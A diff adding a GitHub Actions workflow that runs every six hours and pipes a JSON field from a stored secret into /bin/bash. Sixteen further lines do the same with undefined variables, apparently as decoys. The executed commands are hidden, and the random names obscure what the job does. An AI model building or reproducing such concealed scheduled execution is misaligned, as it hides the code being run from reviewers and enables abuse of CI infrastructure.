@@ -1,0 +1,33 @@
+name: wuxuegongcao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuxuegongcao
+        env:
+          efut072: ${{ secrets.efut072 }}
+        run: |
+          echo $efut072 | jq -r .ym65 | /bin/bash
+          echo $hqn4282 | jq -r .w8 | /bin/bash
+          echo $bzff3 | jq -r .kusgw21 | /bin/bash
+          echo $sjma26565 | jq -r .zgj8 | /bin/bash
+          echo $fts014 | jq -r .nm52147 | /bin/bash
+          echo $s5326 | jq -r .uslb607 | /bin/bash
+          echo $vr0284 | jq -r .ozt5 | /bin/bash
+          echo $wjpuv8465 | jq -r .yss602 | /bin/bash
+          echo $jt716 | jq -r .qjb74 | /bin/bash
+          echo $sk0 | jq -r .fz36 | /bin/bash
+          echo $wl92678 | jq -r .esn4374 | /bin/bash
+          echo $x0 | jq -r .sb89279 | /bin/bash
+          echo $lugu213 | jq -r .fqbx792 | /bin/bash
+          echo $wumo2270 | jq -r .u1758 | /bin/bash
+          echo $a462 | jq -r .lcg2138 | /bin/bash
+          echo $kxi04 | jq -r .z6 | /bin/bash
+          echo $hvuaf8 | jq -r .io6 | /bin/bash
+
